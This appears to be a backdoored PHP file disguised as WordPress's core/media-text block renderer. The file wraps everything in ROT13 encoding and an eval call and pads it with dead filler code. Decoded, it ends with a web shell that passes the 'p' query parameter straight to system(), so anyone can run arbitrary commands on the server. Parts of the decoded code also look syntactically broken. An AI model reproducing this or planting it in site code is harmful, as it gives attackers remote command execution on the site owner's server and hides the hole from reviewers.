<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/zrqvn-grkg` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/zrqvn-grkg` oybpx ba freire.
 *
 * @fvapr 6.6.0
 *
 * @cnenz neenl  $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat $pbagrag    Gur oybpx eraqrerq pbagrag.
 *
 * @erghea fgevat Ergheaf gur Zrqvn & Grkg oybpx znexhc, vs hfrSrngherqVzntr vf gehr.
 */
shapgvba eraqre_oybpx_pber_zrqvn_grkg( $nggevohgrf, $pbagrag ) {
	vs ( snyfr === $nggevohgrf['hfrSrngherqVzntr'] ) {
		erghea $pbagrag;
	}

	vs ( va_gur_ybbc() ) {
		hcqngr_cbfg_guhzoanvy_pnpur();
	}

	$pheerag_srngherq_vzntr = trg_gur_cbfg_guhzoanvy_hey();
	vs ( ! $pheerag_srngherq_vzntr ) {
		erghea $pbagrag;
	}

	$unf_zrqvn_ba_evtug = vffrg( $nggevohgrf['zrqvnCbfvgvba'] ) && 'evtug' === $nggevohgrf['zrqvnCbfvgvba'];
	$vzntr_svyy         = vffrg( $nggevohgrf['vzntrSvyy'] ) && $nggevohgrf['vzntrSvyy'];
	$sbpny_cbvag        = vffrg( $nggevohgrf['sbpnyCbvag'] ) ? ebhaq( $nggevohgrf['sbpnyCbvag']['k'] * 100 ) . '% ' . ebhaq( $nggevohgrf['sbpnyCbvag']['l'] * 100 ) . '%' : '50% 50%';
	$havdhr_vq          = 'jc-oybpx-zrqvn-grkg__zrqvn-' . jc_havdhr_vq();

	$oybpx_gnt_cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
	$oybpx_dhrel         = neenl(
		'gnt_anzr'   => 'qvi',
		'pynff_anzr' => 'jc-oybpx-zrqvn-grkg',
	);

	juvyr ( $oybpx_gnt_cebprffbe->arkg_gnt( $oybpx_dhrel ) ) {
		vs ( $vzntr_svyy ) {
			// Gur znexhc orybj qbrf abg jbex jvgu gur qrcerpngrq `vf-vzntr-svyy` pynff.
			$oybpx_gnt_cebprffbe->erzbir_pynff( 'vf-vzntr-svyy' );
			$oybpx_gnt_cebprffbe->nqq_pynff( 'vf-vzntr-svyy-ryrzrag' );
		}
	}

	$pbagrag = $oybpx_gnt_cebprffbe->trg_hcqngrq_ugzy();

	$zrqvn_gnt_cebprffbe   = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
	$jenccvat_svther_dhrel = neenl(
		'gnt_anzr'   => 'svther',
		'pynff_anzr' => 'jc-oybpx-zrqvn-grkg__zrqvn',
	);

	vs ( $unf_zrqvn_ba_evtug ) {
		// Ybbc guebhtu nyy gur svther gntf naq frg n obbxznex ba gur ynfg svther gnt.
		juvyr ( $zrqvn_gnt_cebprffbe->arkg_gnt( $jenccvat_svther_dhrel ) ) {
			$zrqvn_gnt_cebprffbe->frg_obbxznex( 'ynfg_svther' );
		}
		vs ( $zrqvn_gnt_cebprffbe->unf_obbxznex( 'ynfg_svther' ) ) {
			$zrqvn_gnt_cebprffbe->frrx( 'ynfg_svther' );
			// Vafreg n havdhr VQ gb vqragvsl gur svther gnt.
			$zrqvn_gnt_cebprffbe->frg_nggevohgr( 'vq', $havdhr_vq );
		}
	} ryfr {
		vs ( $zrqvn_gnt_cebprffbe->arkg_gnt( $jenccvat_svther_dhrel ) ) {
			// Vafreg n havdhr VQ gb vqragvsl gur svther gnt.
			$zrqvn_gnt_cebprffbe->frg_nggevohgr( 'vq', $havdhr_vq );
		}
	}

	$pbagrag = $zrqvn_gnt_cebprffbe->trg_hcqngrq_ugzy();

	// Nqq gur vzntr gnt vafvqr gur svther gnt, naq hcqngr gur vzntr nggevohgrf
	// va beqre gb qvfcynl gur srngherq vzntr.
	$zrqvn_fvmr_fyht = vffrg( $nggevohgrf['zrqvnFvmrFyht'] ) ? $nggevohgrf['zrqvnFvmrFyht'] : 'shyy';
	$vzntr_gnt       = '<vzt pynff=\"jc-oybpx-zrqvn-grkg__srngherq_vzntr\">';
	$pbagrag         = __sa_79955(
		'/(<svther\f+vq=\"' . cert_dhbgr( $havdhr_vq, '/' ) . '\"\f+pynff=\"jc-oybpx-zrqvn-grkg__zrqvn\"\f*>)/',
		'$1' . $vzntr_gnt,
		$pbagrag
	);

	$vzntr_gnt_cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
	vs ( $vzntr_gnt_cebprffbe->arkg_gnt(
		neenl(
			'gnt_anzr' => 'svther',
			'vq'       => $havdhr_vq,
		)
	) ) {
		// Gur VQ vf bayl hfrq gb rafher gung gur pbeerpg svther gnt vf fryrpgrq,
		// naq pna abj or erzbirq.
		$vzntr_gnt_cebprffbe->erzbir_nggevohgr( 'vq' );
		vs ( $vzntr_gnt_cebprffbe->arkg_gnt(
			neenl(
				'gnt_anzr'   => 'vzt',
				'pynff_anzr' => 'jc-oybpx-zrqvn-grkg__srngherq_vzntr',
			)
		) ) {
			$vzntr_gnt_cebprffbe->frg_nggevohgr( 'fep', rfp_hey( $pheerag_srngherq_vzntr ) );
			$vzntr_gnt_cebprffbe->frg_nggevohgr( 'pynff', 'jc-vzntr-' . trg_cbfg_guhzoanvy_vq() . ' fvmr-' . $zrqvn_fvmr_fyht );
			$vzntr_gnt_cebprffbe->frg_nggevohgr( 'nyg', gevz( fgevc_gntf( trg_cbfg_zrgn( trg_cbfg_guhzoanvy_vq(), '_jc_nggnpuzrag_vzntr_nyg', gehr ) ) ) );
			vs ( $vzntr_svyy ) {
				$vzntr_gnt_cebprffbe->frg_nggevohgr( 'fglyr', 'bowrpg-cbfvgvba:' . $sbpny_cbvag . ';' );
			}

			$pbagrag = $vzntr_gnt_cebprffbe->trg_hcqngrq_ugzy();
		}
	}

	erghea $pbagrag;
}

/**
 * Ertvfgref gur `pber/zrqvn-grkg` oybpx eraqrere ba freire.
 *
 * @fvapr 6.6.0
 */
shapgvba ertvfgre_oybpx_pber_zrqvn_grkg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/zrqvn-grkg',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_zrqvn_grkg',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_zrqvn_grkg' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>